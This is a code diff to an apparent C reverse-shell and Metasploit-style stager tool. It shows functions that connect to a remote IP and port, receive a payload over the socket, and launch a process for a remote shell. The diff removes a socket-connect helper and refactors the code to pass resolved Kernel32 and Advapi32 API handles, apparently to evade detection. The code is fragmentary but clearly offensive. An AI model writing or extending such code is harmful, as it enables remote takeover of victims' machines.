@@ -24,24 +24,6 @@
 // https://github.com/rsmudge/metasploit-loader/blob/master/src/main.c
 */
 
-SOCKET ConnectRemoteServer(char* ipAddress, int port) {
-	struct sockaddr_in sAddr;
-	SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, 0);
-
-	if (clientSocket == INVALID_SOCKET) {
-		printf("[x] Could not create socket : %d", WSAGetLastError());
-		return FALSE;
-	}
-	sAddr.sin_addr.s_addr = inet_addr(ipAddress);
-	sAddr.sin_family = AF_INET;
-	sAddr.sin_port = htons(port);
-
-	if (connect(clientSocket, (struct sockaddr*)&sAddr, sizeof(sAddr)) != SOCKET_ERROR)
-		return clientSocket;
-	closesocket(clientSocket);
-	return FALSE;
-}
-
 int GetPayloadSize(SOCKET clientSocket) {
 	ULONG32 size;
 	int payloadSize = recv(clientSocket, (char*)&size, 4, 0);
@@ -128,7 +110,7 @@ void EnableVirtualTerminalSequenceProcessing() {
 		printf("Could not enable virtual terminal processing");
 	}
 }*/
-BOOL RunShell(Arguments listAgrument) {
+BOOL RunShell(Kernel32_API kernel32, Advapi32_API advapi32, Arguments listAgrument) {
 	BOOL exitProcess = FALSE;
 	struct sockaddr_in sAddr;
 
@@ -167,7 +149,7 @@ BOOL RunShell(Arguments listAgrument) {
 				STARTUPINFOA StartupInfo;
 				PROCESS_INFORMATION ProcessInfo;
 				printMsg(STATUS_OK, LEVEL_DEFAULT, "Connected to %s:%i\n", ipAddress, listAgrument.port);
-				SendInitInfo(mySocket, NULL);
+				SendInitInfo(kernel32, advapi32,mySocket, NULL);
 
 				memset(&StartupInfo, 0, sizeof(STARTUPINFOA));
 				memset(&ProcessInfo, 0, sizeof(PROCESS_INFORMATION));
